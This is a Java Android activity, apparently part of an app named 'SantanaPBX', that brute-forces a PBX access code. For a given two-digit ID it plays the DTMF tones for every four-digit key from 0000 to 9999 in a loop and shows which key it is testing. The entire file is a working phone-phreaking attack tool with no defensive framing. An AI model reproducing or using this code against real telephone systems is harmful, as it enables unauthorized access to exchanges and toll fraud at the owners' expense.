package com.roguepanda.santanapbx;

import android.app.Activity;
import android.content.Intent;
import android.media.AudioManager;
import android.media.ToneGenerator;
import android.os.Bundle;
import android.os.Handler;
import android.view.Menu;
import android.widget.ProgressBar;
import android.widget.TextView;

public class PhreakPBXActivity extends Activity {
	private int key;
	private int[] keyDigits;
	
	private int id;
	private int[] idDigits;
	
	private TextView viewProgressText;
	private ProgressBar viewProgressBar;
	
	private final int PBXToneDuration = 150;
	private final int PBXWaitDuration = 50;
	private ToneGenerator PBXOut;
	
	private volatile Thread phreakThread;
	private Handler mHandler = new Handler();
	private volatile boolean exitRequested = false;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        key = 0000; //Key will be iterated
        keyDigits = new int[4]; //For formatting/PBX use
        idDigits = new int[2];
        
        PBXOut = new ToneGenerator(AudioManager.STREAM_DTMF, 100);
        
        Intent intent = getIntent();
        id = intent.getIntExtra(SantanaPBXActivity.SECRET_ID, 0);
        idDigits[1] = id / 10;
        idDigits[0] = id % 10;
        
        setContentView(R.layout.activity_phreak_pbx);
        
        TextView viewId = (TextView)findViewById(R.id.secretId);
        viewId.setText("For ID: " + idDigits[1] + idDigits[0]);
        
        viewProgressText = (TextView)findViewById(R.id.progress);
        viewProgressBar = (ProgressBar)findViewById(R.id.progressBar);
        updateDigits();
        
        phreakThread = new Thread(new Runnable() {
        	public void run() {
        		while(!exitRequested && key < 10000){
    				sendPBXCommand();
    	        	key++;

    	        	//Update progress
    	        	mHandler.post(new Runnable() {
    	        		public void run() {
    	        			updateDigits();
    	        		}
    	        	});
        		}
        	}
        });
        phreakThread.start();
        
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        return false;
    }
    
    @Override
    public void onBackPressed() {
    	exitRequested = true;
    	mHandler.removeCallbacks(phreakThread);
    	super.onBackPressed();
    }
    
    public boolean sendPBXCommand() {
	    playPBXTone(idDigits[1]);
	    playPBXTone(idDigits[0]);
	    playPBXTone(keyDigits[3]);
	    playPBXTone(keyDigits[2]);
	    playPBXTone(keyDigits[1]);
	    playPBXTone(keyDigits[0]);
	    playPBXTone(15);
    	return true;
    }
    
    public void playPBXTone(int a_digit) {
    	try{
	    	int tone = ToneGenerator.TONE_DTMF_0 + a_digit;
	    	PBXOut.startTone(tone, PBXToneDuration);
	    	Thread.sleep(PBXToneDuration);
	    	PBXOut.stopTone();
	    	Thread.sleep(PBXWaitDuration);
    	} catch(InterruptedException e) {
    		exitRequested = true;
    	}
    }
    
    public void updateDigits() {
    	keyDigits[3] = key / 1000;
    	keyDigits[2] = (key % 1000) / 100;
    	keyDigits[1] = (key % 100) / 10;
    	keyDigits[0] = key % 10;
    	viewProgressText.setText("Testing key: " + keyDigits[3] + keyDigits[2] + keyDigits[1] + keyDigits[0]);
    	viewProgressBar.setProgress((key * 100) / 9999);
    }

}
